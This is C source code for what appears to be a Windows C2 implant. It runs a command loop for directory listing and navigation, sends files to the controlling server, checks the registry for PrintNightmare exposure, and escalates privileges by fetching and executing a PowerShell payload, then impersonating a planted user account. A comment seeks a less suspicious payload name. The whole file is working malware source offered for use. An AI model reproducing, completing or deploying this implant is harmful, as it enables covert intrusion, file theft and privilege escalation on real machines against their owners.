#include "c2_comms.h"



// Global heap handle
HANDLE heap;
#define Malloc(size) HeapAlloc(HEAP, HEAP_ZERO_MEMORY, (size))
#define Free(ptr) HeapFree(HEAP, 0, (ptr));

// Present working directory, globally accessible
char PWD[MAX_PATH + 1] = {0};

// Attempt to change the PWD to the given path. Returns FALSE if path does not exist.
BOOL change_dir(char *path, int len) {
    // Absolute path
    if(len >= 3 && path[1] == ':' && PathIsDirectoryA(path)) {
        c2_log("PATH: %s   LEN: %d\n", path, len);
        memset(PWD, 0, MAX_PATH + 1);
        strncpy(PWD, path, len);
        PathAddBackslashA(PWD); // Append trailing \ to path if needed
        c2_log("PWD: %s\n", PWD);
        return TRUE;
    }
    // No support for relative paths
    return FALSE;
}


// Write file + directory listing to out
// TODO: segfaults on directories with lots of entries (ex: C:\Windows\System32)
DWORD ls(char *path, char* out) {
    char preparedPath[MAX_PATH + 4];
    LARGE_INTEGER file_size;
    WIN32_FIND_DATA data;
    BOOL status = 0;
    int len = 0;
    
    // Copy the string to a buffer + append '\*' to the directory name
    sprintf(preparedPath, "%s\\*", path);
    
    // Find first file
    HANDLE h = FindFirstFileA(preparedPath, &data);
    if (h == INVALID_HANDLE_VALUE) {
        return -1;
    }

    // Loop through rest of files
    do {
        char* name = data.cFileName;        
        
        // Directory
        if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            len += sprintf((char*) out + len, "DIR     %s\n", name);
        }
        // File
        else {
            file_size.LowPart = data.nFileSizeLow;
            file_size.HighPart = data.nFileSizeHigh;
            len += sprintf((char*) out + len, "FILE    %s \t %lld\n", name, file_size.QuadPart);
        }

        status = FindNextFileA(h, &data);
    } while (status != 0);
    
    FindClose(h);
    if (status == 0 || status == ERROR_NO_MORE_FILES)
        return 0;
    return -1;
}
 

// Reads data from file given by path and sends it back to C2 server
int Exfil(char* path) {
    char abs_path[MAX_PATH + 1] = {0};
    DWORD numBytesRead = 0;
    DWORD numBytesSent = 0;
    LARGE_INTEGER fileSize;

    // Convert relative path to absolute path
    if (path[0] != 'C' || path[1] != ':') {
        sprintf(abs_path, "%s\\%s", PWD, path);
    }
    // Otherwise just use path as-is
    else {
        strcpy(abs_path, path);
    }

    // Open file
    HANDLE hFile = CreateFile(abs_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        numBytesSent = 0;
        goto end;
    }

    // Get file size
    int low = 0;
    low = GetFileSize(hFile, &fileSize.HighPart);
    fileSize.LowPart = low;

    // Allocate buffer on heap for the data
    char* out = (char*) Malloc(fileSize.QuadPart);
    if (out == NULL) {
        numBytesSent = 0;
        goto end;
    }

    // Read data
    BOOL res = ReadFile(hFile, out, fileSize.QuadPart, &numBytesRead, NULL);
    if (!res) {
        numBytesSent = 0;
        goto end;
    }
    numBytesSent = c2_exfil(out, numBytesRead);

end:
    Free(out);
    CloseHandle(hFile);
    return numBytesSent;
}


// Checks the registry to see if host is vulnerable to printer nightmare.
// Returns 1 for vulnerable, 0 for not vulnerable, -1 on error
int check_registry_for_privesc() {
    int vulnerable = 1;
    DWORD status;
    HKEY hKey = NULL;
    DWORD val;          // store registry values here 
    int size = 4;       // size of DWORD, needed for RegGetValue

    // Open handle
    status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint", 0, KEY_READ, &hKey);
    if (status == ERROR_FILE_NOT_FOUND) {
        vulnerable = 0;
        goto end;
    }
    if (status != ERROR_SUCCESS) {
        vulnerable = -1;
        goto end;
    }

    // Read first value
    status = RegGetValue(hKey, NULL, "RestrictDriverInstallationToAdministrators", RRF_RT_REG_DWORD, NULL, &val, &size);
    if (status == ERROR_FILE_NOT_FOUND || (status == ERROR_SUCCESS && val != 0)) {
        vulnerable = 0;
        goto end;
    }
    if (status != ERROR_SUCCESS) {
        vulnerable = -1;
        goto end;
    }

    // Need to check both registry values
    status = RegGetValue(hKey, NULL, "NoWarningNoElevationOnInstall", RRF_RT_REG_DWORD, NULL, &val, &size);
    if (status == ERROR_FILE_NOT_FOUND || (status == ERROR_SUCCESS && val != 1)) {
        vulnerable = 0;
        goto end;
    }
    if (status != ERROR_SUCCESS) {
        vulnerable = -1;
        goto end;
    }

end:
    if (hKey) { RegCloseKey(hKey); }
    return vulnerable;
}


// Creates a file in the present working directory and writes the printer nightmare powershell script to it.
// Returns NULL on failure, and the path to the script on success.
// TODO: name the payload something less sus than "script.ps1"
char* DownloadScript() {
    char* payload_path;
    char* payload_data;

    // Allocate buffer for payload path
    payload_path = Malloc(2 * MAX_PATH);
    if (payload_path == NULL) {
        return NULL;
    }

    // Allocate buffer for payload data
    payload_data = Malloc(500*1000); // Allocate 500 Kb to be safe
    if (payload_data == NULL) {
        Free(payload_path);
        return NULL;
    }

    // Receive payload
    c2_send("SCRIPT", 6);
    int len = c2_recv(payload_data, 500*1000);
    if (len <= 0) {
        Free(payload_data);
        Free(payload_path);
        return NULL;
    }

    // Create file for payload to be written to
    strcpy(payload_path, PWD);
    strcat(payload_path, "\\script.ps1");
    HANDLE hFile = CreateFile(payload_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        Free(payload_data);
        Free(payload_path);
        return NULL;
    }

    // Write payload
    if (! WriteFile(hFile, payload_data, len, NULL, NULL)) {
        Free(payload_data);
        Free(payload_path);
        CloseHandle(hFile);
        DeleteFile(payload_path);
        return NULL;
    }

    Free(payload_data);
    CloseHandle(hFile);
    return payload_path;
}


// Attempts to get the security token for the user "john"
DWORD Impersonate() {
    HANDLE hToken;
    int status;

    // Try to log on as the user we created from printer nightmare
    status = LogonUserA("john", ".", "john", LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken);
    if (status == 0) {
        c2_log("[!] ERROR: could not log on", 27);
        return -1;
    }

    // Imprtsonate the user to get their privs
    status = ImpersonateLoggedOnUser(hToken);
    if (status == 0) {
        c2_log("[!] ERROR: could not impersonate", 32);
        CloseHandle(hToken);
        return -1;
    }
    CloseHandle(hToken);
    return 0;
}


// Attempts to gain administrator privileges via the Printer Nightmare CVE.
// Works by downloading and executing a powershell script.
DWORD Escalate() {
    char* script_path;
    STARTUPINFO startInfo;
    PROCESS_INFORMATION procInfo;
    DWORD ret = 0;

    // Set up process structures
    ZeroMemory(&startInfo, sizeof(startInfo));
    startInfo.cb = sizeof(startInfo);

    // Check registry first
    int vulnerable  = check_registry_for_privesc();
    if (vulnerable == 0) {
        c2_log("Target not vulnerable", 21);
        ret = -1;
        goto end;
    }
    if (vulnerable == -1) {
        c2_log("ERROR: Could not check registry", 31);
        ret = -1;
        goto end;
    }

    // Download script
    script_path = DownloadScript();
    if (script_path == NULL) {
        c2_log("ERROR: Could not download script", 32);
        ret = -1;
        goto end;
    }
    c2_log("Script path: %s\n", script_path);

    // Execute the powershell script
    ret = CreateProcess(NULL, "powershell.exe -File script.ps1", NULL, NULL, FALSE, 0, NULL, NULL, &startInfo, &procInfo);
    if (!ret) {
        c2_log("Spawning powershell failed\n");
        ret = -1;
        goto end;
    }
    WaitForSingleObject(procInfo.hProcess, INFINITE);
    c2_log("[+] Script ran successfully\n");
    CloseHandle(procInfo.hProcess);
    CloseHandle(procInfo.hThread);

    // Attempt to impersonate
    ret = Impersonate();
    if (ret != 0) {
        c2_log("[!] Could not impersonate", 25);
        ret = -1;
        goto end;
    }

end:
    if (script_path) {
        DeleteFile(script_path);
        Free(script_path);
    }
    return ret;
}





// cl implant.c  /Fe:implant.exe /DDEBUG /DEBUG
// cl implant.c /Fe:implant.exe
int main() {
    int status = 0;
    unsigned int len = 0;
    char buffer[1024] = {0};


    // Network setup
    status = SetupComms();
    if (status < 0) {
        c2_log("[!] ERROR in comms setup\n");
        TearDownComms();
        return -1;
    }
    c2_log("[+] Comms setup sucessfully\n");

    // Other setup
    heap = GetProcessHeap();
    GetCurrentDirectory(_MAX_PATH, PWD);

    
    c2_send("READY", 5); // we need an initial send so we can get a corresponding response
    while (1) {
        // Recv data
        int n = c2_recv(buffer, 1024);
        if (n <= 0) {
            c2_log("[!] Didn't receive any data!\n");
            continue;
        }


        c2_log("RECV: %s\n", buffer);


        // Main logic of implant
        // Note: to maintain synchronization between requests and responses, always need to send something back to server
        if (strncmp(buffer, "exit", 4) == 0) {
            break;
        }

        else if (strncmp(buffer, "pwd", 3) == 0) {
            c2_send(PWD, strlen(PWD));
        }

        else if(strncmp(buffer, "cd ", 3) == 0 && n >= 4) {
            if (change_dir(buffer + 3, n - 3)) { // buffer + 3 is start of arg passed to cd
                c2_send(PWD, strlen(PWD));
            }
            else { c2_send("[!] Invalid dir", 15); }
        }

        else if(strncmp(buffer, "ls", 2) == 0) {
            char listing[4096] = {0};
            if (n == 2)
                status = ls(PWD, listing);
            else if (n >= 4)
                status = ls(buffer + 3, listing); // arg passed to ls

            // Check result
            if (status == 0) {
                c2_send(listing, strlen(listing));
            }
            else {
                c2_send("[!] Error in ls", 15);
            }
        }

        else if(strncmp(buffer, "exfil ", 6) == 0) {
            if (n >= 7) {
                status = Exfil(buffer + 6);
                if (status > 0) { c2_send("OK", 2); }
                else { c2_send("[!] exfil error", 15); }
            }
            else {
                c2_send("[!] No arg", 10);
            }
        }

        else if (strncmp(buffer, "check", 5) == 0) {
            status = check_registry_for_privesc();
            if (status == 1) { c2_send("[+] Host vulnerable", 19); }
            else if (status == 0) { c2_send("[!] Host not vulnerable", 23); }
            else { c2_send("[!] Error in check", 18); }
        }

        // else if (strncmp(buffer, "download", 8) == 0) {
        //     char* path = DownloadScript();
        //     c2_send(path, strlen(path));
        //     Free(path);
        // }

        else if (strncmp(buffer, "escalate", 8) == 0) {
            status = Escalate();
            if (status == 0) { c2_send("[+] Escalate sucess", 19); }
            else { c2_send("[!] Error in privesc", 20); }
        }

        // else if (strncmp(buffer, "impersonate", 11) == 0) {
        //     status = Impersonate();
        //     if (status == 0) { c2_send("[+] success", 11); }
        //     else { c2_send("[!] failure", 11); } 
        // }

        else {
            c2_send("[!] Invalid command", 19);
        }

        
        

        // Clear buffer
        memset(buffer, 0, 1024);
    }
    





    TearDownComms();
    return 0;
}
